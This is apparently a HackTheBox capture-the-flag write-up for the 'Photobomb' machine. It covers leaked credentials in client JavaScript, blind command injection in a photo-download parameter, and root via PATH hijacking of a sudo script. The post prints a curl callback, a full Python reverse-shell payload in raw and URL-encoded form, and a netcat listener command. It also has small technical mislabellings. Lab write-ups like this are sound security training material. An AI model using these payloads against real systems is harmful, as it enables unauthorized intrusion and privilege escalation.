---
layout: post
title: "Photobomb Writeup"
author: "Mouse"
categories: hackthebox
tags: [writeup]
image: photobomb.png
permalink: /hackthebox/photobomb-writeup
---

### Introduction

This is a writeup of the [HackTheBox Photobomb machine](https://app.hackthebox.com/machines/Photobomb). As usual, we start with an nmap scan. We first scan the top 10,000 ports, and then scan the open ports more aggressively.

##### Command:
> nmap --top-ports 10000 [target]

```
Nmap scan report for [target]
Host is up (0.056s latency).
Not shown: 8338 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 3.33 seconds
```

We see that ports 22 and 80 are open.

##### Command:
> nmap -p 22,80 -A -sC -sV [target]

```
Nmap scan report for [target]
Host is up (0.013s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh 	OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http	nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.18 seconds
```

We see that SSH is open on port 22, and there is a web server running on port 80, which redirects to ```http://photobomb.htb```. We add this to ```/etc/hosts```, and take a visit.

![alt text](/assets/img/hackthebox/photobomb/landing_page.PNG "Web Page")

We are met with an old-looking webpage, which appears to be a landing page for a webapp. The hyperlink leads to ```photobomb.htb/printer``` which when clicked, reveals an admin login portal.

Next, we inspect the page’s sources. We find a javascript file at ```photobomb.htb/photobomb.js```. This contains the following interesting code:

{% highlight javascript %}
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
{% endhighlight %}

It would appear that when a user presents a certain cookie, the login form will prepopulate with credentials. Very secure…

We see that for this prepopulation to occur, a regular expression must be satisfied:

```
<p>/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)</p>
```

Putting this into [a regular expression to normal language converter](https://regexr.com/), we observe that we can essentially put anything at the start, include the string ```isPhotoBombTechSupport = ```, and then anything else.

Using the Burp Suite proxy, we can intercept the HTTP request sent when navigating to ```photobomb.htb/printer```, inject a cookie with the header ```isPhotoBombTechSupport```, and send this off to the server.

The intercepted HTTP request, with the injected cookie, looks as follows:

```
GET /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/
Upgrade-Insecure-Requests: 1

isPhotoBombTechSupport = true
```

This is forwarded to the web server, and our cookie injection was successful. We have been forwarded to the ```photobomb.htb/printer``` page. The below two images show the top and bottom of this webpage, respectively.

![alt text](/assets/img/hackthebox/photobomb/printer_top.PNG "Web Page")

![alt text](/assets/img/hackthebox/photobomb/printer_bottom.PNG "Web Page")

This page has the following functionality. A user can select one of the given images, choose a filetype between JPG and PNG, choose an image size, and press the ```DOWNLOAD PHOTO TO PRINT``` button. This button will download the selected image to the user’s local system.

Let’s examine this download request using Burp Suite. This is the request:

```
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 80
Origin: http://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1

photo=wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg&filetype=jpg&dimensions=30x20
```

There are three parameters being sent - ```photo``` holding the file of the requested photo, ```filetype``` which holds a string denoting the requested filetype, and ```dimensions``` denoting the size of the requested photo. ```photo``` likely is required to be a file, ```dimensions``` likely gets parsed into integers, but it appears we can put whatever string we want into the ```filetype``` parameter - rife for command injection!

Note that any payloads must be [URL encoded](https://meyerweb.com/eric/tools/dencoder/). We must also start the payloads with a valid filetype, then escape using a ```;``` character. We start by seeing if the ```id``` command works.

##### Payload:
> png;id

The response gave an error message, informing us that the server failed to generate the requested photo. No other information was revealed. Not all hope is lost - it could be that we only have blind command injection capabilities.

To check if the commands are executed at all, we try use ```curl``` on our own web server, where we will see any connections. We use Python to start up a basic web server on port 80.

##### Command:
>python3 -m http.server 80

##### Raw Payload:
> png;curl -XGET [my ip]

##### URL-Encoded Payload:
> png%3Bcurl%20-XGET%20[my ip]

After a few seconds, a connection was received on the Python web server - we have blind command injection capabilities!

```
└─$ python3 -m http.server 80                                                                  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.182 - - [23/Dec/2022 04:43:11] "GET / HTTP/1.1" 200 -
```

We now inject a Python reverse shell into the ```filetype``` parameter.

##### Command for Listener:
> nc -lnvp [my port]

##### Raw Payload:
>png;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(([my ip],[my port]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

##### URL-Endoded Payload:
>png%3Bpython3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(
socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%5Bmy%20ip%5D%2C%5Bmy%20port%5D)
)%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)
%3Bimport%20pty%3B%20pty.spawn(%22sh%22)%27

And this worked!

```
└─$ nc -lnvp 1234                                                                            	
listening on [any] 1234 ...
connect to [my ip] from (UNKNOWN) [target] 60160                                                                                      
$ id                                                                                              	 
id                                                                                                	 
uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)    	
```

We see we are the ```wizard``` user. The command ```python3 -c 'import pty; pty.spawn("/bin/bash")'``` is used to get a slightly more stable shell. We now navigate to ```wizard```’s home directory, and find the ```user.txt``` flag.

```
wizard@photobomb:~/photobomb$ pwd  
pwd
/home/wizard/photobomb
wizard@photobomb:~/photobomb$ cd ..
cd ..
wizard@photobomb:~$ ls
ls
find  photobomb  user.txt
wizard@photobomb:~$ cat user.txt
cat user.txt
E3858e23d33f0ad60d0f8eb759cab843
```
Now it is time for privilege escalation. We check what ```wizard``` can run as sudo.

##### Command:
> sudo -l

```
wizard@photobomb:~$ sudo -l
sudo -l
Matching Defaults entries for wizard on photobomb:
	env_reset, mail_badpass,
	secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
	(root) SETENV: NOPASSWD: /opt/cleanup.sh
```

There is a shell script called ```cleanup.sh``` which we can run as root. When reading this file, we encounter the following script - let’s break this down.

{% highlight console %}
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
{% endhighlight %}

Firstly, ```.bashrc``` is run, which will start an interactive shell session. The script navigates to the ```photobomb``` directory, and starts a conditional loop. If the file ```log/photobomb.log``` exists with size greater than 0, and if this file is not a symblink, then the loop runs.
>For more on shell scripting conditional flags, [this reference](https://tldp.org/LDP/Bash-Beginners-Guide/html/sect_07_01.html) has a list.

If these conditions are met, then the contents of the log file are copied into the file ```log/photobomb.log.old```, and the original log file is truncated to size 0. I.e. the contents of the log are backed up into a new file, and its contents cleared.

The final line finds all the files with a ```jpg``` extension, and sets all their permissions to ```root```. Notice that this ```find``` command does not use the full path of the find application, unlike other commands used. This opens the doors to an unquoted service path exploit…

We navigate to the ```/tmp``` directory (where we will have write privileges), and create a new ```find``` file. Inside here, we inject the script:

```
#!/bin/bash
bash
```

This script will simply run a bash script. Since the ```cleanup.sh``` script runs as root, this malicious ```find``` script will also run as root, giving us a root shell. We give our new ```find``` file execute permissions with ```chmod +x find```, update the PATH variable to have ```/tmp``` at the front (this will ensure the malicious ```find``` runs, instead of the benign one), and run the script.

##### Command:
> sudo PATH=/tmp:$PATH /opt/cleanup.sh

When this is run, we get root access! We navigate to the ```root``` directory, and loot our final flag ```root.txt```.

```
root@photobomb:/home/wizard/photobomb# whoami
whoami
root
root@photobomb:/home/wizard/photobomb# cat /root/root.txt
cat /root/root.txt
d96f7d723faa8ca61d10c5cfe4fb4436
```

![alt text](/assets/img/hackthebox/photobomb/pwned.PNG "pwned")

To conclude, in this machine we found a vulnerable website, injected a cookie to login to the admin portal and injected another cookie to gain initial access with a reverse shell. To escalate privileges, we exploited a simple PATH variable manipulation on the ```find``` command, which did not use an absolute path in the script we found.

This machine has highlighted the importance of not disclosing potential vulnerabilities in comments - we saw that the initial admin login page was to be prepopulated. We could also directly see the cookie we needed to manipulate - this should not have been available for users to see. Furthermore, this machine was yet another instance where non-absolute paths were used in shell scripts. This is such a simple vulnerability to fix, yet so ubiquitous and too easy to exploit.

### Tools Used
* nmap
* netcat
* Burp Suite

### External Links
